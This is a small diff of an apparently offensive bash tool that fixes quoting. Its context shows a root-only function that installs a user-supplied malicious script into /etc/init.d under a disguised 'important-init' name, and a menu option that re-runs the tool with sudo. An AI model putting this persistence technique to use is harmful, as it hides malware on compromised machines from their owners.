@@ -550,7 +550,7 @@ fi
 malint_func(){
 if [[ "$priv_status" == "is_su" ]]; then
 read -rp $'\033[0;91m[*]\e[0m Enter path to your script > ' mal_file_path
-cat << EOF > '/etc/init.d/$random-important-init'
+cat << EOF > "/etc/init.d/$random-important-init"
 #!/bin/sh
 
 start_daemon() {
@@ -623,7 +623,7 @@ case $choice in
     [Rr][Oo][Oo][Tt])
         sleep 1 && \
         echo -e "${RED}[*]${EOC} Restarting script with ${RED}root privileges${EOC}..." \
-        clear && exec sudo -s $current_shell "$0"; ;;
+        clear && exec sudo -s "$current_shell" "$0"; ;;
 
     *) echo -e "\n${RED}[!]${EOC} ${BOLD}Choose correct option.${EOC}\n" && menu;;
     esac;
